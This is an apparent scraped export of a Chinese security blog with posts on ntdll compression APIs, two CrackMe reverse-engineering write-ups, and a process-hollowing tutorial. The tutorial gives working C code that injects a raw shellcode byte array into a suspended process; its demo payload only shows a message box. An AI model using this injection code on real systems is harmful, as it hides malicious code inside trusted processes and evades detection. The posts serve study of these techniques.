CompressionFormatAndEngine：指定压缩格式和引擎类型。该参数必须设置为以下组合之一： COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM CompressBufferWorkSpaceSize：指向调用者分配的缓冲区指针，用于接受压缩缓冲区所需的大小。此值可确定RtlCompressBuffer的工作空间缓冲区的正确大小。 CompressFragmentWorkSpaceSize：一个指向可调用者分配缓冲区的指针，用于接收将压缩缓冲区解压缩为片段所需的大小。此值用于确定RtlDecompressFragment的工作空间缓冲区的正确大小。 返回值：返回STATUS_SUCCESS成功，否则失败。 RtlCompressBuffer压缩一个可以由文件系统驱动程序使用的缓冲区，以促进文件压缩的实现。 12345678910NT_RTL_COMPRESS_API NTSTATUS RtlCompressBuffer( USHORT CompressionFormatAndEngine, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, ULONG UncompressedChunkSize, PULONG FinalCompressedSize, PVOID WorkSpace); CompressionFormatAndEngine：指定压缩格式和引擎类型的位掩码，此参数必须设置为一种格式类型和一种引擎类型的有效按位或组合。相关值得含义如下： 值 含义 COMPRESSION_FORMAT_LZNT1 LZ压缩算法 COMPRESSION_FORMAT_XPRESS Xpress压缩算法 COMPRESSION_FORMAT_XPRESS_HUFF Huffman压缩算法 COMPRESSION_ENGINE_STANDARD 标准压缩算法 COMPRESSION_ENGINE_MAXIMUM 最大程序压缩 UncompressedBuffer：指向要压缩的数据缓冲区的指针。该参数为必须不可为空。 UncompressedBufferSize：指定UncompressedBuffer缓冲区的大小 CompressedBuffer：指向压缩之后数据缓冲区的指针，用于接收压缩数据。该参数为必须的不可以为空。 CompressedBufferSize：指定CompressedBuffer缓冲区的大小。 UncompressedChunkSize：指定压缩UncompressedBuffer缓冲区时使用块的大小。该参数必须是以下值之一：512、1024、2048或者4096。操作系统使用4096，因此此参数推荐值也是、4096。 FinalCompressedSize 指向调用者分配变量的指针，该变量接收存储在CompressedBuffer中的压缩数据的大小。该参数为必须的，不能为NULL。 WorkSpace：在压缩期间指定由RtlCompressBuffer函数使用的调用者分配的工作空间缓冲区的指针。使用RtlGetCompressionWorkSpaceSize函数可以确定工作缓冲区的正确大小。 返回值：返回STATUS_SUNCCESS表示成功，否则失败。 RtlDecompressBuffer解压缩整个压缩缓冲区 12345678NT_RTL_COMPRESS_API NTSTATUS RtlDecompressBuffer( USHORT CompressionFormat, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, PULONG FinalUncompressedSize); CompressionFormat：指定压缩缓冲区中压缩格式的位掩码。该参数必须设置为COMPRESSION_FORMAT_LZNT1。它和其他相关压缩格式的含义如下： 值 含义 COMPRESSION_FORMAT_LZNT1 LZ压缩算法 COMPRESSION_FORMAT_XPRESS Xpress压缩算法 UncompressedBuffer：指向存储解压缩数据的缓冲区指针，该缓冲区从CompressedBuffer接收解压缩数据。该参数是必须的，不可以为NULL。 UncompressedBufferSize：指定UncompressedBuffer缓冲区的大小。 CompressedBuffer：指向要解压缩的数据缓冲区的指针。该参数是必须的不可以为空。 CompressedBufferSize：指定CompressedBuffer缓冲区的大小。 FinalUncompressedSize：指向解压之后得到的数据大小的指针，该变量接收在UncompressedBuffer中存储的解压缩数据的大小。该参数是必须的，不能为NULL。 返回值：返回STATUS_SUCCESS则表示成功，否则失败。 编码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;BOOL CompressData(BYTE* pUnCompressData, DWORD dwUncompressDataLen, BYTE** ppCompressData, DWORD* pdwCompressDataLen);BOOL DeCompressData(BYTE* pCompressData, DWORD dwCompressDataLen, BYTE** ppUnCompressData, DWORD* pdwUncompressDataLen);typedef NTSTATUS (WINAPI * FN_RtlGetCompressionWorkSpaceSize)( USHORT CompressionFormatAndEngine, PULONG CompressBufferWorkSpaceSize, PULONG CompressFragmentWorkSpaceSize);typedef NTSTATUS (WINAPI* FN_RtlCompressBuffer)( USHORT CompressionFormatAndEngine, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, ULONG UncompressedChunkSize, PULONG FinalCompressedSize, PVOID WorkSpace );typedef NTSTATUS (WINAPI* FN_RtlDecompressBuffer)( USHORT CompressionFormat, PUCHAR UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer, ULONG CompressedBufferSize, PULONG FinalUncompressedSize);int main() &#123; DWORD i = 0; BOOL flag = FALSE; char buffer[] = &quot;b1ackie&quot;; DWORD dwBufferLen = strlen(buffer); BYTE* pCompressData = NULL; DWORD dwCompreeDataLen = 0; BYTE* pUnCompressData = NULL; DWORD dwUnCompressDataLen = 0; CompressData((BYTE*)buffer, dwBufferLen, &amp;pCompressData, &amp;dwCompreeDataLen); DeCompressData(pCompressData, dwCompreeDataLen, &amp;pUnCompressData, &amp;dwUnCompressDataLen); printf(&quot;原始数据：\\n&quot;); for (int i = 0; i &lt; dwBufferLen; i++) &#123; printf(&quot;%x &quot;, buffer[i]); &#125; printf(&quot;\\n加密后数据：\\n&quot;); for (int i = 0; i &lt; dwCompreeDataLen; i++) &#123; printf(&quot;%x &quot;, pCompressData[i]); &#125; printf(&quot;\\n解密后数据\\n&quot;); for (int i = 0; i &lt; dwUnCompressDataLen; i++) &#123; printf(&quot;%x &quot;, pUnCompressData[i]); &#125; if (pUnCompressData) &#123; delete[]pUnCompressData; pUnCompressData = NULL; &#125; if (pCompressData) &#123; delete[]pCompressData; pCompressData = NULL; &#125; getchar(); return 0;&#125;BOOL CompressData(BYTE* pUnCompressData, DWORD dwUncompressDataLen, BYTE** ppCompressData, DWORD* pdwCompressDataLen)&#123; BOOL flag = FALSE; NTSTATUS status = 0; DWORD dwWorkSpaceSize = 0; DWORD dwFragmentWorkSpaceSize = 0; BYTE* pWorkSpace = NULL; BYTE* pCompressData = NULL; DWORD dwCompressDataLen = 4096; DWORD dwFinalCompressSize = 0; HMODULE hDll = NULL; do &#123; hDll = LoadLibraryA(&quot;ntdll.dll&quot;); if (hDll == NULL) &#123; printf(&quot;加载NTDLL失败\\n&quot;); break; &#125; FN_RtlGetCompressionWorkSpaceSize RtlGetCompressionWorkSpaceSize = (FN_RtlGetCompressionWorkSpaceSize)GetProcAddress(hDll, &quot;RtlGetCompressionWorkSpaceSize&quot;); if (RtlGetCompressionWorkSpaceSize == NULL) &#123; printf(&quot;获取RtlGetCompressionWorkSpaceSize函数地址失败\\n&quot;); break; &#125; FN_RtlCompressBuffer RtlCompressBuffer = (FN_RtlCompressBuffer)GetProcAddress(hDll, &quot;RtlCompressBuffer&quot;); if (RtlCompressBuffer == NULL) &#123; printf(&quot;获取RtlCompressBuffer地址失败\\n&quot;); break; &#125; //获取WORKSPACE的大小 status = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD, &amp;dwWorkSpaceSize, &amp;dwFragmentWorkSpaceSize); if (status!=0) &#123; printf(&quot;获取workspace大小失败\\n&quot;); break; &#125; pWorkSpace = new BYTE[dwWorkSpaceSize]; if (pWorkSpace == NULL) &#123; printf(&quot;1申请内存失败\\n&quot;); break; &#125; RtlZeroMemory(pWorkSpace, dwWorkSpaceSize); while (TRUE) &#123; pCompressData = new BYTE[dwCompressDataLen]; if (pCompressData == NULL) &#123; printf(&quot;2申请内存失败\\n&quot;); break; &#125; RtlZeroMemory(pCompressData, dwCompressDataLen); //压缩数据 RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1, pUnCompressData, dwUncompressDataLen, pCompressData, dwCompressDataLen, 4096, &amp;dwFinalCompressSize, (PVOID)pWorkSpace); if (dwCompressDataLen &lt; dwFinalCompressSize) &#123; if (pCompressData) &#123; delete[]pCompressData; pCompressData = NULL; &#125; dwCompressDataLen = dwFinalCompressSize; &#125; else &#123; break; &#125; &#125; *ppCompressData = pCompressData; *pdwCompressDataLen = dwFinalCompressSize; flag = TRUE; &#125;while(FALSE); if(pWorkSpace) &#123; delete[]pWorkSpace; pWorkSpace = NULL; &#125; if (hDll) &#123; FreeLibrary(hDll); &#125; return flag;&#125;BOOL DeCompressData(BYTE* pCompressData, DWORD dwCompressDataLen, BYTE** ppUnCompressData, DWORD* pdwUncompressDataLen)&#123; BOOL flag = FALSE; HMODULE hDll = NULL; BYTE* pUnCompressData = NULL; DWORD dwUnCompressDataLen = 4096; DWORD dwFinalUnCompressSize = 0; do &#123; hDll = LoadLibraryA(&quot;ntdll.dll&quot;); if (hDll == NULL) &#123; printf(&quot;加载NTDLL失败\\n&quot;); break; &#125; FN_RtlDecompressBuffer RtlDecompressBuffer = (FN_RtlDecompressBuffer)GetProcAddress(hDll, &quot;RtlDecompressBuffer&quot;); if (RtlDecompressBuffer == NULL) &#123; printf(&quot;获取RtlDecompressBuffer地址失败\\n&quot;); break; &#125; while (TRUE) &#123; pUnCompressData = new BYTE[dwUnCompressDataLen]; if (pUnCompressData == NULL) &#123; printf(&quot;3申请内存失败\\n&quot;); break; &#125; RtlZeroMemory(pUnCompressData, dwUnCompressDataLen); RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, pUnCompressData, dwUnCompressDataLen, pCompressData, dwCompressDataLen, &amp;dwFinalUnCompressSize); if (dwUnCompressDataLen &lt; dwFinalUnCompressSize) &#123; if (pUnCompressData) &#123; delete[]pUnCompressData; pUnCompressData = NULL; &#125; dwUnCompressDataLen = dwFinalUnCompressSize; &#125; else &#123; break; &#125; &#125; *ppUnCompressData = pUnCompressData; *pdwUncompressDataLen = dwFinalUnCompressSize; flag = TRUE; &#125; while (FALSE); if (hDll) &#123; FreeLibrary(hDll); &#125; return flag;&#125; 参考《Windows黑客编程技术详解》","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"压缩技术","slug":"压缩技术","permalink":"https://b1ack1e.github.io/tags/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF/"}]},{"title":"160CrackMe-008","slug":"160CrackMe-008","date":"2021-08-04T09:38:43.000Z","updated":"2021-08-09T10:54:15.567Z","comments":true,"path":"2021/08/04/160CrackMe-008/","link":"","permalink":"https://b1ack1e.github.io/2021/08/04/160CrackMe-008/","excerpt":"","text":"初探打开程序直接输入一个注册码，输入错误弹出错误提示窗口。 分析无壳，是使用VB编写的的 使用OD直接搜索错误弹窗的提示，可以直接定位一个关键跳转。 开始分析一下，就在上面不远处，是明文比较输入与SynTaX 2oo1 输入SynTaX 2oo1即可成功 总结有点简单了。。。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"隐藏技术-傀儡进程","slug":"隐藏技术-傀儡进程","date":"2021-08-03T09:37:27.000Z","updated":"2021-08-09T10:52:31.783Z","comments":true,"path":"2021/08/03/隐藏技术-傀儡进程/","link":"","permalink":"https://b1ack1e.github.io/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/","excerpt":"","text":"傀儡进程借着正常的软件进程或者系统进程的外壳来进行恶意的操作。 函数介绍GetThreadContext检索指定线程的上下文 64位程序可以使用Wow64GetThreadContext检索WOW64线程的上下文。 1234BOOL GetThreadContext( HANDLE hThread, LPCONTEXT lpContext); hThread：要检索其上下文的线程的句柄。句柄必须有THREAD_GET_CONTEXT访问权限。 lpContext：指向上下文结构的指针，它接受指定线程适当的上下文。该结构中的ContextFlags成员可以指定检索线程上下文的哪些部分。上下文结构具有高度的处理器特性。 返回值：成功返回不为0，否则为0。 SetThreadContext设置指定线程的上下文。64位可以用Wow64SetThreadContext设置 1234BOOL SetThreadContext( HANDLE hThread, const CONTEXT *lpContext); hThread：指定线程的句柄，并将设置其上下文。该句柄必须具有线程的THREAD_SET_CONTEXT权限。 lpContext：指向要在指定进程中设置上下文结构的指针。此结构中ContextFlags成员值可以指定要设置线程上下文的哪些部分。 返回值：如果设置了上下文，则返回值为非0，否则为0； ResumeThread减少线程的暂停计数。当暂停计数减到0时，恢复线程的执行。 123DWORD ResumeThread( HANDLE hThread); hThread：要重新启动线程的句柄。该句柄必须具有THREAD_SUSPEND_RESUME权限。 返回值：如果成功，返回值是线程先前挂起的计数，如果失败，则返回（DWORD）-1。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;BOOL ReplacProcess(char* pszFilePath);char data[] = &#123; 0x55 ,0x8B ,0xEC ,0x83 ,0xEC ,0x4C ,0xE8 ,0x15 ,0x01 ,0x00 ,0x00 ,0x89 ,0x45 ,0xFC ,0x8B ,0x45 ,0xFC ,0x50 ,0xE8 ,0x29 ,0x01 ,0x00 ,0x00 ,0x83 ,0xC4 ,0x04 ,0x89 ,0x45 ,0xF8 ,0xC6 ,0x45 ,0xB4 ,0x4C ,0xC6 ,0x45 ,0xB5 ,0x6F ,0xC6 ,0x45 ,0xB6 ,0x61 ,0xC6 ,0x45 ,0xB7 ,0x64 ,0xC6 ,0x45 ,0xB8 ,0x4C ,0xC6 ,0x45 ,0xB9 ,0x69 ,0xC6 ,0x45 ,0xBA ,0x62 ,0xC6 ,0x45 ,0xBB ,0x72 ,0xC6 ,0x45 ,0xBC ,0x61 ,0xC6 ,0x45 ,0xBD ,0x72 ,0xC6 ,0x45 ,0xBE ,0x79 ,0xC6 ,0x45 ,0xBF ,0x41 ,0xC6 ,0x45 ,0xC0 ,0x00 ,0x8D ,0x4D ,0xB4 ,0x51 ,0x8B ,0x55 ,0xFC ,0x52 ,0xFF ,0x55 ,0xF8 ,0x89 ,0x45 ,0xF4 ,0xC6 ,0x45 ,0xC4 ,0x4D ,0xC6 ,0x45 ,0xC5 ,0x65 ,0xC6 ,0x45 ,0xC6 ,0x73 ,0xC6 ,0x45 ,0xC7 ,0x73 ,0xC6 ,0x45 ,0xC8 ,0x61 ,0xC6 ,0x45 ,0xC9 ,0x67 ,0xC6 ,0x45 ,0xCA ,0x65 ,0xC6 ,0x45 ,0xCB ,0x42 ,0xC6 ,0x45 ,0xCC ,0x6F ,0xC6 ,0x45 ,0xCD ,0x78 ,0xC6 ,0x45 ,0xCE ,0x41 ,0xC6 ,0x45 ,0xCF ,0x00 ,0xC6 ,0x45 ,0xD0 ,0x55 ,0xC6 ,0x45 ,0xD1 ,0x73 ,0xC6 ,0x45 ,0xD2 ,0x65 ,0xC6 ,0x45 ,0xD3 ,0x72 ,0xC6 ,0x45 ,0xD4 ,0x33 ,0xC6 ,0x45 ,0xD5 ,0x32 ,0xC6 ,0x45 ,0xD6 ,0x2E ,0xC6 ,0x45 ,0xD7 ,0x64 ,0xC6 ,0x45 ,0xD8 ,0x6C ,0xC6 ,0x45 ,0xD9 ,0x6C ,0xC6 ,0x45 ,0xDA ,0x00 ,0x8D ,0x45 ,0xC4 ,0x50 ,0x8D ,0x4D ,0xD0 ,0x51 ,0xFF ,0x55 ,0xF4 ,0x50 ,0xFF ,0x55 ,0xF8 ,0x89 ,0x45 ,0xF0 ,0xC6 ,0x45 ,0xDC ,0x62 ,0xC6 ,0x45 ,0xDD ,0x31 ,0xC6 ,0x45 ,0xDE ,0x61 ,0xC6 ,0x45 ,0xDF ,0x63 ,0xC6 ,0x45 ,0xE0 ,0x6B ,0xC6 ,0x45 ,0xE1 ,0x69 ,0xC6 ,0x45 ,0xE2 ,0x65 ,0xC6 ,0x45 ,0xE3 ,0x21 ,0xC6 ,0x45 ,0xE4 ,0x00 ,0xC6 ,0x45 ,0xE8 ,0x74 ,0xC6 ,0x45 ,0xE9 ,0x65 ,0xC6 ,0x45 ,0xEA ,0x73 ,0xC6 ,0x45 ,0xEB ,0x74 ,0xC6 ,0x45 ,0xEC ,0x00 ,0x6A ,0x00 ,0x8D ,0x55 ,0xE8 ,0x52 ,0x8D ,0x45 ,0xDC ,0x50 ,0x6A ,0x00 ,0xFF ,0x55 ,0xF0 ,0x33 ,0xC0 ,0x8B ,0xE5 ,0x5D ,0xC3 ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0x64 ,0xA1 ,0x30 ,0x00 ,0x00 ,0x00 ,0x8B ,0x40 ,0x0C ,0x8B ,0x40 ,0x14 ,0x8B ,0x00 ,0x8B ,0x00 ,0x8B ,0x40 ,0x10 ,0xC3 ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0xCC ,0x55 ,0x8B ,0xEC ,0x83 ,0xEC ,0x2C ,0x8B ,0x45 ,0x08 ,0x89 ,0x45 ,0xF8 ,0x8B ,0x4D ,0xF8 ,0x8B ,0x55 ,0xF8 ,0x03 ,0x51 ,0x3C ,0x89 ,0x55 ,0xE8 ,0xB8 ,0x08 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC8 ,0x00 ,0x8B ,0x55 ,0xE8 ,0x8B ,0x45 ,0xF8 ,0x03 ,0x44 ,0x0A ,0x78 ,0x89 ,0x45 ,0xF0 ,0x8B ,0x4D ,0xF0 ,0x8B ,0x55 ,0xF8 ,0x03 ,0x51 ,0x20 ,0x89 ,0x55 ,0xE0 ,0x8B ,0x45 ,0xF0 ,0x8B ,0x4D ,0xF8 ,0x03 ,0x48 ,0x24 ,0x89 ,0x4D ,0xDC ,0x8B ,0x55 ,0xF0 ,0x8B ,0x45 ,0xF8 ,0x03 ,0x42 ,0x1C ,0x89 ,0x45 ,0xD8 ,0x8B ,0x4D ,0xF0 ,0x8B ,0x51 ,0x18 ,0x89 ,0x55 ,0xE4 ,0xC7 ,0x45 ,0xEC ,0x00 ,0x00 ,0x00 ,0x00 ,0xC7 ,0x45 ,0xF4 ,0x00 ,0x00 ,0x00 ,0x00 ,0xEB ,0x09 ,0x8B ,0x45 ,0xF4 ,0x83 ,0xC0 ,0x01 ,0x89 ,0x45 ,0xF4 ,0x8B ,0x4D ,0xF4 ,0x3B ,0x4D ,0xE4 ,0x0F ,0x83 ,0x6D ,0x01 ,0x00 ,0x00 ,0x8B ,0x55 ,0xF4 ,0x8B ,0x45 ,0xE0 ,0x8B ,0x4D ,0xF8 ,0x03 ,0x0C ,0x90 ,0x89 ,0x4D ,0xFC ,0xBA ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC2 ,0x00 ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x47 ,0x0F ,0x85 ,0x41 ,0x01 ,0x00 ,0x00 ,0xB8 ,0x01 ,0x00 ,0x00 ,0x00 ,0xC1 ,0xE0 ,0x00 ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x65 ,0x0F ,0x85 ,0x29 ,0x01 ,0x00 ,0x00 ,0xB8 ,0x01 ,0x00 ,0x00 ,0x00 ,0xD1 ,0xE0 ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x74 ,0x0F ,0x85 ,0x12 ,0x01 ,0x00 ,0x00 ,0xB8 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC8 ,0x03 ,0x8B ,0x55 ,0xFC ,0x0F ,0xBE ,0x04 ,0x0A ,0x83 ,0xF8 ,0x50 ,0x0F ,0x85 ,0xFA ,0x00 ,0x00 ,0x00 ,0xB9 ,0x01 ,0x00 ,0x00 ,0x00 ,0xC1 ,0xE1 ,0x02 ,0x8B ,0x55 ,0xFC ,0x0F ,0xBE ,0x04 ,0x0A ,0x83 ,0xF8 ,0x72 ,0x0F ,0x85 ,0xE2 ,0x00 ,0x00 ,0x00 ,0xB9 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xD1 ,0x05 ,0x8B ,0x45 ,0xFC ,0x0F ,0xBE ,0x0C ,0x10 ,0x83 ,0xF9 ,0x6F ,0x0F ,0x85 ,0xCA ,0x00 ,0x00 ,0x00 ,0xBA ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC2 ,0x06 ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x63 ,0x0F ,0x85 ,0xB2 ,0x00 ,0x00 ,0x00 ,0xB8 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC8 ,0x07 ,0x8B ,0x55 ,0xFC ,0x0F ,0xBE ,0x04 ,0x0A ,0x83 ,0xF8 ,0x41 ,0x0F ,0x85 ,0x9A ,0x00 ,0x00 ,0x00 ,0xB9 ,0x01 ,0x00 ,0x00 ,0x00 ,0xC1 ,0xE1 ,0x03 ,0x8B ,0x55 ,0xFC ,0x0F ,0xBE ,0x04 ,0x0A ,0x83 ,0xF8 ,0x64 ,0x0F ,0x85 ,0x82 ,0x00 ,0x00 ,0x00 ,0xB9 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xD1 ,0x09 ,0x8B ,0x45 ,0xFC ,0x0F ,0xBE ,0x0C ,0x10 ,0x83 ,0xF9 ,0x64 ,0x75 ,0x6E ,0xBA ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC2 ,0x0A ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x72 ,0x75 ,0x5A ,0xB8 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC8 ,0x0B ,0x8B ,0x55 ,0xFC ,0x0F ,0xBE ,0x04 ,0x0A ,0x83 ,0xF8 ,0x65 ,0x75 ,0x46 ,0xB9 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xD1 ,0x0C ,0x8B ,0x45 ,0xFC ,0x0F ,0xBE ,0x0C ,0x10 ,0x83 ,0xF9 ,0x73 ,0x75 ,0x32 ,0xBA ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC2 ,0x0D ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x73 ,0x75 ,0x1E ,0x8B ,0x45 ,0xF4 ,0x8B ,0x4D ,0xDC ,0x0F ,0xB7 ,0x14 ,0x41 ,0x89 ,0x55 ,0xEC ,0x8B ,0x45 ,0xEC ,0x8B ,0x4D ,0xD8 ,0x8B ,0x55 ,0xF8 ,0x03 ,0x14 ,0x81 ,0x89 ,0x55 ,0xD4 ,0xEB ,0x05 ,0xE9 ,0x7E ,0xFE ,0xFF ,0xFF ,0x8B ,0x45 ,0xD4 ,0x8B ,0xE5 ,0x5D ,0xC3 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 &#125;;int main() &#123; if (ReplacProcess(&quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\ConsoleApplication1.exe&quot;) == TRUE) &#123; printf(&quot;傀儡进程成功\\n&quot;); &#125; else &#123; printf(&quot;失败\\n&quot;); &#125; return 0;&#125;BOOL ReplacProcess(char* pszFilePath)&#123; STARTUPINFO si; PROCESS_INFORMATION pi; CONTEXT threadContext = &#123; 0 &#125;; RtlZeroMemory(&amp;si, sizeof(si)); RtlZeroMemory(&amp;pi, sizeof(pi)); RtlZeroMemory(&amp;threadContext, sizeof(threadContext)); si.cb = sizeof(STARTUPINFO); BOOL Flag = FALSE; //创建挂起的进程 Flag = CreateProcess(pszFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi); if (Flag == FALSE) &#123; printf(&quot;创建挂起进程失败\\n&quot;); return FALSE; &#125; //获取线程的上下文 threadContext.ContextFlags = CONTEXT_FULL; Flag = GetThreadContext(pi.hThread, &amp;threadContext); if (Flag == FALSE) &#123; printf(&quot;获取线程上下文失败\\n&quot;); return FALSE; &#125; // 拿到目标进程主线程上下文后，在Ebx寄存器中保存的就是PEB的地址， // 而PEB结构偏移0x8的位置是AddressOfImageBase字段， // 所以直接来读取ctx.Ebx+0x8，就可以获取到目标进程的加载基址 LPVOID lpBuffer = 0; Flag = ReadProcessMemory(pi.hProcess, (LPVOID)(threadContext.Ebx + 0x8), &amp;lpBuffer, 4, NULL); if (Flag == FALSE) &#123; printf(&quot;读取内存数据失败\\n&quot;); return FALSE; &#125; //写入shellcode Flag = WriteProcessMemory(pi.hProcess, (LPVOID)threadContext.Eax, data, sizeof(data), NULL); if (Flag == FALSE) &#123; printf(&quot;写入数据失败\\n&quot;); return FALSE; &#125; //恢复执行 ResumeThread(pi.hThread); return TRUE;&#125; 运行程序可以看到成功弹出shellcode 的内容。 使用任务管理器查看可以看到傀儡进程。 参考《Windows黑客编程技术详解》 创建傀儡进程代码","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"隐藏技术","slug":"隐藏技术","permalink":"https://b1ack1e.github.io/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"}]},{"title":"160CrackMe-007","slug":"160CrackMe-007","date":"2021-08-03T02:52:32.000Z","updated":"2021-08-09T10:54:14.295Z","comments":true,"path":"2021/08/03/160CrackMe-007/","link":"","permalink":"https://b1ack1e.github.io/2021/08/03/160CrackMe-007/","excerpt":"","text":"初探打开程序还是和上一个有很熟悉的画面，不愧是同一个作者做的。 about按钮了解情况，还是需要让按钮消失然后露出logo就算成功了。 分析无壳，是使用delphi编写的。 还是直接使用DeDark查看，然后去下断 断下来之后进行分析，可以看到一个较为关键的跳转，在此之前的函数比较重要，进去查看一下。 进来之后果然看到了算法 12345678910111213141516171819202122232425262728293031323334353637383940004429EE |. 8945 F4 mov dword ptr ss:[ebp-0xC],eax004429F1 |. BE 01000000 mov esi,0x1004429F6 |&gt; 8B45 F8 /mov eax,dword ptr ss:[ebp-0x8]004429F9 |. E8 3610FCFF |call aLoNg3x_.00403A34004429FE |. 83F8 01 |cmp eax,0x100442A01 |. 7C 1D |jl short aLoNg3x_.00442A2000442A03 |&gt; 8B55 F8 |/mov edx,dword ptr ss:[ebp-0x8]00442A06 |. 0FB65432 FF ||movzx edx,byte ptr ds:[edx+esi-0x1]00442A0B |. 8B4D F8 ||mov ecx,dword ptr ss:[ebp-0x8]00442A0E |. 0FB64C01 FF ||movzx ecx,byte ptr ds:[ecx+eax-0x1]00442A13 |. 0FAFD1 ||imul edx,ecx00442A16 |. 0FAFD7 ||imul edx,edi00442A19 |. 03DA ||add ebx,edx00442A1B |. 48 ||dec eax00442A1C |. 85C0 ||test eax,eax00442A1E |.^ 75 E3 |\\jnz short aLoNg3x_.00442A0300442A20 |&gt; 46 |inc esi00442A21 |. FF4D F4 |dec dword ptr ss:[ebp-0xC]00442A24 |.^ 75 D0 \\jnz short aLoNg3x_.004429F600442A26 |&gt; 8BC3 mov eax,ebx00442A28 |. 99 cdq00442A29 |. 33C2 xor eax,edx00442A2B |. 2BC2 sub eax,edx00442A2D |. B9 2A2C0A00 mov ecx,0xA2C2A00442A32 |. 99 cdq00442A33 |. F7F9 idiv ecx00442A35 |. 8BDA mov ebx,edx00442A37 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442A3A |. B9 59000000 mov ecx,0x5900442A3F |. 99 cdq00442A40 |. F7F9 idiv ecx00442A42 |. 8BC8 mov ecx,eax00442A44 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442A47 |. BE 50000000 mov esi,0x5000442A4C |. 99 cdq00442A4D |. F7FE idiv esi00442A4F |. 03CA add ecx,edx00442A51 |. 41 inc ecx00442A52 |. 894D FC mov dword ptr ss:[ebp-0x4],ecx00442A55 |. 3B5D FC cmp ebx,dword ptr ss:[ebp-0x4] 但是问题是，其中edi的值一直为0，这导致一直在计算的值都是0，然后再进行比较，是不可以的，必须要找到edi在何处被赋值。 往上慢慢寻找一下，可以看到此处edi的值是通过eax赋值的，那么又要寻找eax的值，函数内部没有，需要出去函数寻找。 出函数之后，看到eax的值是通过一个地址传递的 继续找寻此地址的值是从何处得来，下硬件断点，没有断下来，说明不满足条件，不过在上面不远处就可以看到这个地址的赋值。看到如果想要进入此处需要让上面的JZ跳转不跳走，进入前面的函数看看 